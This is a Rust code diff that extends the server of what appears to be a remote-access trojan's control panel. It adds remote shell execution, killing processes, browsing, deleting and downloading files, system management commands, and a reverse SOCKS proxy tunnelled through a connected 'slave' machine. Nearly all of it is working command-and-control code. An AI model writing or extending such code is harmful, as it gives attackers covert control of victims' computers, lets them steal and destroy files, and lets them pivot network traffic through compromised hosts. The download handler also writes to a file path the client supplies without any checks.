@@ -5,14 +5,18 @@ use std::net::SocketAddr;
 use std::sync::{ Arc, Mutex };
 use tauri::{ AppHandle, Manager };
 
-use common::async_impl::packets::ClientInfo;
+use common::packets::ClientInfo;
 
 use rand::rngs::OsRng;
 use rand::Rng;
 use rsa::{pkcs8::ToPublicKey, PaddingScheme, RsaPrivateKey, RsaPublicKey};
 use base64::{engine::general_purpose, Engine as _};
 
-use common::async_impl::packets::*;
+use tokio::{io::{self, AsyncWriteExt, AsyncReadExt}, task, net::{TcpListener, TcpStream}};
+use common::socks::MAGIC_FLAG;
+use net2::TcpStreamExt;
+
+use common::packets::*;
 
 use anyhow::{Context, Result};
 
@@ -36,6 +40,7 @@ pub struct ServerWrapper {
     priv_key: RsaPrivateKey,
     pub_key: RsaPublicKey,
     tauri_handle: Option<Arc<Mutex<AppHandle>>>,
+    reverse_proxy_tasks: HashMap<std::net::SocketAddr, tokio::task::JoinHandle<()>>,
 }
 
 impl ServerWrapper {
@@ -54,6 +59,7 @@ impl ServerWrapper {
             priv_key,
             pub_key,
             tauri_handle: None,
+            reverse_proxy_tasks: HashMap::new(),
         };
 
         s.channel_loop().await;
@@ -192,6 +198,65 @@ impl ServerWrapper {
                             .unwrap_or_else(|e| println!("Failed to send screenshot request: {}", e));
                     }
                 }
+                GetProcessList(addr) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::GetProcessList))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send get process list request: {}", e));
+                    }
+                }
+                ProcessList(addr, process_list) => {
+                    let payload = serde_json::json!({
+                        "addr": addr.to_string(),
+                        "processes": process_list.processes.clone()
+                    });
+
+                    if let Some(handle) = &self.tauri_handle {
+                        handle.lock().unwrap().emit_all("process_list", payload).unwrap_or_else(|e| println!("Failed to emit process_list event: {}", e));
+                    } else {
+                        println!("Cannot send process_list event: Tauri handle not set");
+                    }
+                }
+                KillProcess(addr, process) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::KillProcess(process)))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send kill process request: {}", e));
+                    }
+                }
+                StartShell(addr) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::StartShell))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send start shell request: {}", e));
+                    }
+                }
+                ExitShell(addr) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::ExitShell))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send exit shell request: {}", e));
+                    }
+                }
+                ShellCommand(addr, command) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::ShellCommand(command)))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send shell command request: {}", e));
+                    }
+                }
+                ShellOutput(addr, output) => {
+                    let payload = serde_json::json!({
+                        "addr": addr.to_string(),
+                        "shell_output": output.clone()
+                    });
+
+                    if let Some(handle) = &self.tauri_handle {
+                        handle.lock().unwrap().emit_all("client_shellout", payload).unwrap_or_else(|e| println!("Failed to emit shell_output event: {}", e));
+                    } else {
+                        println!("Cannot send client_shellout event: Tauri handle not set");
+                    }
+                }
                 StartRemoteDesktop(addr, config) => {
                     if let Some(tx) = self.txs.get(&addr) {
                         tx.send(ClientCommand::Write(ClientboundPacket::StartRemoteDesktop(config)))
@@ -307,6 +372,246 @@ impl ServerWrapper {
                             .unwrap_or_else(|e| println!("Failed to send reconnect request: {}", e));
                     }
                 }
+                ManageSystem(addr, command) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::ManageSystem(command)))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send manage system request: {}", e));
+                    }
+                }
+
+                PreviousDir(addr) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::PreviousDir))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send previous dir request: {}", e));
+                    }
+                }
+
+                ViewDir(addr, path) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::ViewDir(path)))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send view dir request: {}", e));
+                    }
+                }
+
+                AvailableDisks(addr) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::AvailableDisks))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send available disks request: {}", e));
+                    }
+                }
+
+                RemoveDir(addr, path) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::RemoveDir(path)))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send remove dir request: {}", e));
+                    }
+                }
+
+                RemoveFile(addr, path) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::RemoveFile(path)))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send remove file request: {}", e));
+                    }
+                }
+
+                DownloadFile(addr, path) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::DownloadFile(path)))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send download file request: {}", e));
+                    }
+                }
+
+                DisksResult(addr, disks) => {
+                    let mut files = Vec::new();
+                    for disk in disks {
+                        files
+                        .push(File {
+                            file_type: "dir".to_string(),
+                            name: format!("{}:\\", disk),
+                        });
+                    } 
+
+                    let payload = serde_json::json!({
+                        "addr": addr.to_string(),
+                        "files": files
+                    });
+                    
+                    if let Some(handle) = &self.tauri_handle {
+                        handle.lock().unwrap().emit_all("files_result", payload).unwrap_or_else(|e| println!("Failed to emit files result event: {}", e));
+                    } else {
+                        println!("Cannot send files result event: Tauri handle not set");
+                    }
+                }
+                
+                FileList(addr, files) => {
+                    let payload = serde_json::json!({
+                        "addr": addr.to_string(),
+                        "files": files
+                    });
+
+                    println!("Sending file list: {:?}", payload);
+                    
+                    if let Some(handle) = &self.tauri_handle {
+                        handle.lock().unwrap().emit_all("files_result", payload).unwrap_or_else(|e| println!("Failed to emit file list event: {}", e));
+                    } else {
+                        println!("Cannot send file list event: Tauri handle not set");
+                    }
+                }
+                
+                CurrentFolder(addr, path) => {
+                    let payload = serde_json::json!({
+                        "addr": addr.to_string(),
+                        "path": path
+                    });
+                    
+                    if let Some(handle) = &self.tauri_handle {
+                        handle.lock().unwrap().emit_all("current_folder", payload).unwrap_or_else(|e| println!("Failed to emit current folder event: {}", e));
+                    } else {
+                        println!("Cannot send current folder event: Tauri handle not set");
+                    }
+                }
+                
+                DownloadFileResult(addr, file_data) => {
+                    let _ = std::fs::write(file_data.name, file_data.data);
+                }
+
+                StartReverseProxy(addr, port, local_port) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::StartReverseProxy(port.clone())))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send start reverse proxy request: {}", e));
+                    }
+
+                    let master_addr = format!("{}:{}", "0.0.0.0", port);
+                    let socks_addr = format!("{}:{}", "0.0.0.0", local_port);
+                    
+                    let slave_listener = match TcpListener::bind(&master_addr).await{
+                        Err(e) => {
+                            return;
+                        },
+                        Ok(p) => p
+                    };
+            
+                    let (slave_stream , slave_addr) = match slave_listener.accept().await{
+                        Err(e) => {
+                            return;
+                        },
+                        Ok(p) => p
+                    };
+            
+                    let raw_stream = slave_stream.into_std().unwrap();
+                    raw_stream.set_keepalive(Some(std::time::Duration::from_secs(10))).unwrap();
+                    let mut slave_stream = TcpStream::from_std(raw_stream).unwrap();            
+                    
+                    let listener = match TcpListener::bind(&socks_addr).await{
+                        Err(e) => {
+                            return;
+                        },
+                        Ok(p) => p
+                    };
+            
+                    let task = tokio::spawn(async move {
+                    loop {
+                        let (stream , _) = listener.accept().await.unwrap();
+            
+                        let raw_stream = stream.into_std().unwrap();
+                        raw_stream.set_keepalive(Some(std::time::Duration::from_secs(10))).unwrap();
+                        let mut stream = TcpStream::from_std(raw_stream).unwrap();
+            
+                        if let Err(e) = slave_stream.write_all(&[MAGIC_FLAG[0]]).await{
+                            break;
+                        };
+            
+                        let (proxy_stream , slave_addr) = match slave_listener.accept().await{
+                            Err(e) => {
+                                return;
+                            },
+                            Ok(p) => p
+                        };
+            
+                        let raw_stream = proxy_stream.into_std().unwrap();
+                        raw_stream.set_keepalive(Some(std::time::Duration::from_secs(10))).unwrap();
+                        let mut proxy_stream = TcpStream::from_std(raw_stream).unwrap();
+            
+            
+                        let task = tokio::spawn(async move {
+                            let mut buf1 = [0u8 ; 1024];
+                            let mut buf2 = [0u8 ; 1024];
+            
+                            loop{
+                                tokio::select! {
+                                    a = proxy_stream.read(&mut buf1) => {
+                    
+                                        let len = match a {
+                                            Err(_) => {
+                                                break;
+                                            }
+                                            Ok(p) => p
+                                        };
+                                        match stream.write_all(&buf1[..len]).await {
+                                            Err(_) => {
+                                                break;
+                                            }
+                                            Ok(p) => p
+                                        };
+                    
+                                        if len == 0 {
+                                            break;
+                                        }
+                                    },
+                                    b = stream.read(&mut buf2) =>  { 
+                                        let len = match b{
+                                            Err(_) => {
+                                                break;
+                                            }
+                                            Ok(p) => p
+                                        };
+                                        match proxy_stream.write_all(&buf2[..len]).await {
+                                            Err(_) => {
+                                                break;
+                                            }
+                                            Ok(p) => p
+                                        };
+                                        if len == 0 {
+                                            break;
+                                        }
+                                    },
+                                }
+                            }
+                        });
+
+                        break;
+
+                    }
+                });
+
+                println!("Inserting reverse proxy task for {}", addr);
+                self.reverse_proxy_tasks.insert(addr, task);
+
+                }
+
+                StopReverseProxy(addr) => {
+                    if let Some(tx) = self.txs.get(&addr) {
+                        tx.send(ClientCommand::Write(ClientboundPacket::StopReverseProxy))
+                            .await
+                            .unwrap_or_else(|e| println!("Failed to send stop reverse proxy request: {}", e));
+                    }
+
+                    if let Some(task) = self.reverse_proxy_tasks.get(&addr) {
+                        task.abort();
+                    }
+
+                    self.reverse_proxy_tasks.remove(&addr);
+                }
+
+
             }
         }
     }
